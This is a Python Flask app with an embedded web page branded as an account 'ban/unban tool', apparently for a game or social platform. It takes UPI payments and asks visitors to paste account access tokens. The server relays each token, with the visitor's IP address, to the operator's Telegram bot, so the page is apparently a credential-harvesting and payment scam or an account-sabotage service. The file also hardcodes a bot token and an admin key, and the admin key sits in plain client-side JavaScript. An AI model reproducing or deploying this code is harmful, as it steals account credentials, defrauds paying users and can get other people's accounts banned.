from flask import Flask, request, jsonify, render_template_string
import requests
from datetime import datetime
import random
import string

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8822384225:AAFRhO0m2iXex10zrAO85wVrY3AJ1w5daB4"
OWNER_ID = "8910330347"

# Admin Key for Owner Panel
ADMIN_KEY = "TITANXPOWER2"

# In-memory storage for generated keys (Render restart hone par reset ho jayega)
GENERATED_KEYS = set()

# ================== THE HTML WEBPAGE ==================
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TITAN X BAN UNBAN TOOL</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
  
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
  body {
    background: #050505;
    color: #fff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow-x: hidden;
  }
  #matrix {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    z-index: 0; opacity: 0.1;
  }
  .container {
    position: relative; z-index: 1; width: 100%; max-width: 450px; padding: 20px;
  }
  .card {
    background: rgba(15, 15, 15, 0.95);
    border: 1px solid #ff0033;
    border-radius: 15px;
    padding: 30px 20px;
    box-shadow: 0 0 30px rgba(255, 0, 51, 0.2);
  }
  .title {
    text-align: center; font-size: 24px; font-weight: 900; 
    color: #fff; text-shadow: 0 0 15px #ff0033, 0 0 30px #ff0033;
    margin-bottom: 5px; cursor: pointer; user-select: none; letter-spacing: 2px;
  }
  .subtitle {
    text-align: center; font-size: 12px; color: #ff0033; margin-bottom: 25px; letter-spacing: 3px;
  }
  .screen { display: none; animation: fadeIn 0.4s ease; }
  .screen.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  
  .btn {
    width: 100%; padding: 15px; background: transparent;
    border: 1px solid #ff0033; border-radius: 8px;
    color: #fff; font-size: 14px; font-weight: bold; cursor: pointer;
    margin-bottom: 15px; transition: 0.3s; letter-spacing: 1px;
  }
  .btn:hover { background: #ff0033; box-shadow: 0 0 20px #ff0033; }
  
  .btn-green { border-color: #00ff66; }
  .btn-green:hover { background: #00ff66; box-shadow: 0 0 20px #00ff66; color: #000; }
  
  input {
    width: 100%; padding: 15px; background: #000; border: 1px solid #333;
    border-radius: 8px; color: #fff; margin-bottom: 15px; outline: none;
  }
  input:focus { border-color: #ff0033; box-shadow: 0 0 10px rgba(255,0,51,0.3); }
  
  .price-tag { text-align: center; font-size: 20px; color: #00ff66; margin-bottom: 15px; font-weight: bold; }
  .info-text { font-size: 12px; text-align: center; color: #888; margin-bottom: 15px; }
  .error { color: #ff0033; font-size: 12px; text-align: center; margin-bottom: 10px; display: none; }
  
  .timer-box {
    text-align: center; font-size: 24px; color: #ff0033; font-weight: bold;
    margin: 15px 0; padding: 10px; border: 1px dashed #ff0033; border-radius: 8px;
  }

  /* Admin Panel Specific */
  .admin-box {
    background: #000; border: 1px solid #ff0033; padding: 15px; border-radius: 8px; margin-bottom: 15px;
  }
  .key-display {
    background: #111; padding: 10px; border: 1px dashed #00ff66; color: #00ff66;
    text-align: center; font-size: 18px; margin-top: 10px; letter-spacing: 2px;
  }
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <div class="card">
    
    <div class="title" id="logo">TITAN X</div>
    <div class="subtitle">BAN UNBAN TOOL</div>

    <!-- MAIN MENU -->
    <div id="screen-main" class="screen active">
      <button class="btn" onclick="selectOption('permanent')">PERMANENT ACC BAN (FREE)</button>
      <button class="btn" onclick="selectOption('30days')">30 DAYS BAN (99 RS)</button>
      <button class="btn btn-green" onclick="selectOption('unban')">UNBAN ACC (399 RS)</button>
    </div>

    <!-- ACCESS KEY VERIFY SCREEN -->
    <div id="screen-access" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;" id="access-title">ENTER ACCESS KEY</h3>
      <p class="info-text" id="access-desc">Enter key to proceed</p>
      <input type="text" id="input-key" placeholder="Enter Access Key" autocomplete="off">
      <button class="btn btn-green" onclick="verifyKey()">VERIFY & PROCEED</button>
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK</button>
    </div>

    <!-- TOKEN ENTRY -->
    <div id="screen-token" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#ff0033;" id="token-title">ENTER ACCESS TOKEN</h3>
      <input type="text" id="input-token" placeholder="Paste token here" autocomplete="off">
      <button class="btn" id="btn-submit-token" onclick="submitToken()">SUBMIT</button>
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK</button>
    </div>

    <!-- PAYMENT SCREEN -->
    <div id="screen-pay" class="screen">
      <div class="price-tag" id="pay-price">PAY 99 RS</div>
      <img id="qr-image" src="" style="width:100%; border-radius:10px; margin-bottom:15px; border:2px solid #333;">
      <div class="info-text">UPI ID: 9773978195@fam<br>Pay to get access</div>
      
      <div class="timer-box" id="countdown">10:00</div>
      
      <button class="btn btn-green" onclick="showScreen('screen-utr')">I HAVE PAID</button>
    </div>

    <!-- UTR SCREEN -->
    <div id="screen-utr" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;">ENTER UTR</h3>
      <input type="text" id="input-utr" placeholder="12 digit UTR number" autocomplete="off">
      <button class="btn btn-green" onclick="submitUTR()">SUBMIT UTR</button>
    </div>

    <!-- SUCCESS SCREEN -->
    <div id="screen-success" class="screen">
      <h2 style="text-align:center; color:#00ff66; margin-bottom:20px; text-shadow:0 0 10px #00ff66;">PAYMENT RECEIVED</h2>
      <p class="info-text" style="color:#fff; font-size:14px;">Now contact owner for access key and provide your UTR.</p>
      <button class="btn" onclick="window.open('https://t.me/Titantrusted', '_blank')">CONTACT OWNER</button>
    </div>

    <!-- OWNER PANEL -->
    <div id="screen-owner" class="screen">
      <h3 style="text-align:center; color:#ff0033; margin-bottom:15px;">OWNER PANEL</h3>
      
      <div class="admin-box">
        <p style="color:#fff; font-size:14px; margin-bottom:10px;">30 DAYS BAN ACCESS</p>
        <button class="btn btn-green" onclick="generateKey('30days')">GENERATE KEY</button>
        <div id="key-display-30" class="key-display" style="display:none;"></div>
      </div>

      <div class="admin-box">
        <p style="color:#fff; font-size:14px; margin-bottom:10px;">UNBAN ACCESS</p>
        <button class="btn btn-green" onclick="generateKey('unban')">GENERATE KEY</button>
        <div id="key-display-unban" class="key-display" style="display:none;"></div>
      </div>
      
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK TO WEB</button>
    </div>

  </div>
</div>

<script>
// Matrix Animation
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
const drops = Array(Math.floor(canvas.width/14)).fill(1);
setInterval(() => {
  ctx.fillStyle = 'rgba(5, 5, 5, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#ff0033'; ctx.font = '14px monospace';
  for (let i = 0; i < drops.length; i++) {
    ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
    if (drops[i]*14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}, 50);

let currentType = '';
let timerInterval;

function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function selectOption(type) {
  currentType = type;
  if (type === 'permanent') {
    // Permanent Ban ke liye direct token
    document.getElementById('token-title').innerText = "PERMANENT BAN - ENTER TOKEN";
    showScreen('screen-token');
  } else if (type === '30days') {
    // 30 Days Ban ke liye pehle access key
    document.getElementById('access-title').innerText = "ENTER 30 DAYS ACCESS KEY";
    document.getElementById('access-desc').innerText = "Buy key from owner or pay 99 Rs below";
    showScreen('screen-access');
  } else if (type === 'unban') {
    // Unban ke liye pehle access key
    document.getElementById('access-title').innerText = "ENTER UNBAN ACCESS KEY";
    document.getElementById('access-desc').innerText = "Buy key from owner or pay 399 Rs below";
    showScreen('screen-access');
  }
}

function verifyKey() {
  const key = document.getElementById('input-key').value.trim();
  if(!key) return alert("Enter key");

  fetch('/api/verify_key', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ key: key, action: currentType })
  })
  .then(res => res.json())
  .then(data => {
    if(data.valid) {
      // Key sahi hai, ab token maango
      document.getElementById('token-title').innerText = "KEY VERIFIED - ENTER TOKEN";
      showScreen('screen-token');
    } else {
      // Key galat hai, payment par bhejo
      if(currentType === '30days') {
        startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=99', 99);
      } else {
        startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=399', 399);
      }
    }
  });
}

function startPayment(qrUrl, amount) {
  document.getElementById('pay-price').innerText = "PAY " + amount + " RS";
  document.getElementById('qr-image').src = qrUrl;
  showScreen('screen-pay');
  startTimer(600); // 10 mins
}

function startTimer(duration) {
  clearInterval(timerInterval);
  let timer = duration, minutes, seconds;
  timerInterval = setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;
    document.getElementById('countdown').innerText = minutes + ":" + seconds;
    if (--timer < 0) {
      clearInterval(timerInterval);
      document.getElementById('countdown').innerText = "EXPIRED";
    }
  }, 1000);
}

function submitToken() {
  const token = document.getElementById('input-token').value;
  if(!token) return alert("Enter token");
  
  fetch('/api/webhook', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ type: 'BAN_REQUEST', token: token, action: currentType })
  }).then(() => {
    alert("BAN REQUEST SENT! WAIT FOR ADMIN.");
    showScreen('screen-main');
  });
}

function submitUTR() {
  const utr = document.getElementById('input-utr').value;
  if(!utr) return alert("Enter UTR");
  
  fetch('/api/webhook', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ type: 'PAYMENT', utr: utr, action: currentType })
  }).then(() => {
    showScreen('screen-success');
  });
}

// Admin Panel Generate Key
function generateKey(type) {
  fetch('/api/generate_key', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ type: type, admin_key: "TITANXPOWER2" })
  })
  .then(res => res.json())
  .then(data => {
    if(data.key) {
      const displayId = type === '30days' ? 'key-display-30' : 'key-display-unban';
      const el = document.getElementById(displayId);
      el.innerText = data.key;
      el.style.display = 'block';
    }
  });
}

// Owner Panel (Double tap logo)
let logoClicks = 0;
document.getElementById('logo').addEventListener('click', () => {
  logoClicks++;
  setTimeout(() => logoClicks = 0, 500);
  if (logoClicks === 2) {
    const pass = prompt("Enter Admin Key:");
    if (pass === "TITANXPOWER2") showScreen('screen-owner');
  }
});
</script>
</body>
</html>
"""

# ================== ROUTES ==================
@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/api/verify_key', methods=['POST'])
def verify_key():
    data = request.json
    key = data.get('key')
    # Agar key generated list me hai, toh valid
    if key in GENERATED_KEYS:
        GENERATED_KEYS.remove(key) # Ek baar use hone ke baad delete
        return jsonify({"valid": True})
    return jsonify({"valid": False})

@app.route('/api/generate_key', methods=['POST'])
def generate_key():
    data = request.json
    if data.get('admin_key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    # Random 8 character key generate karo
    key = "TITAN-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    GENERATED_KEYS.add(key)
    return jsonify({"key": key})

@app.route('/api/webhook', methods=['POST'])
def webhook():
    data = request.json
    msg_type = data.get('type')
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr

    if msg_type == 'BAN_REQUEST':
        text = f"NEW BAN REQUEST FROM WEB\n\nAction: {data.get('action')}\nToken: {data.get('token')}\nIP: {ip}"
        send_telegram_msg(text)
        return jsonify({"ok": True})
        
    elif msg_type == 'PAYMENT':
        text = f"NEW PAYMENT RECEIVED ON WEB\n\nAction: {data.get('action')}\nUTR: {data.get('utr')}\nIP: {ip}"
        send_telegram_msg(text)
        return jsonify({"ok": True})

    return jsonify({"error": "Invalid request"}), 400

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": OWNER_ID, "text": text}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Failed to send msg: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
